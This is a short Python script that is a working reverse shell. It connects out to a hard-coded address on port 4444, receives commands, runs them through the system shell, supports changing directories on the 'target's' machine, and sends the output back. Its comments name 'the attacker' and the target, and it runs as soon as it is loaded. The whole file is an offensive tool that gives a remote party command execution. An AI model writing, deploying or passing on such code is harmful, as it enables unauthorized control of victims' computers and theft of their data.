import socket
import subprocess
import os

os.system("clear || cls")
def Connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(('1.2.3.4', 4444))
    disconnect = 'exit'
    while True:
        command =  s.recv(1024)
        
        if len(command) > 0:
            if disconnect.encode("utf-8") in command: # attacker wishes to disconnect
                s.close() # close connection
                break 
            elif command.decode("utf-8").split()[0] == 'cd' and len(command.decode("utf-8").split()) == 2: # Use this to navigate around targets pc.. Needed when not using an interactive shell
                dir = command.decode("utf-8").split()[1] # path the attacker wants to go to
                if os.path.exists(dir): # check if path exists
                    os.chdir(dir) # change working directory
                    s.send(str.encode(str(os.getcwd())+ '> '))
                else: # directory did not exist
                    s.send(str.encode('Invalid Directory!\n' + str(os.getcwd()) + '> '))
            else:
                cmd = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # run shell command (no continuous shell/powershell instance currently)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))

Connect() # connect whether or not loaded as script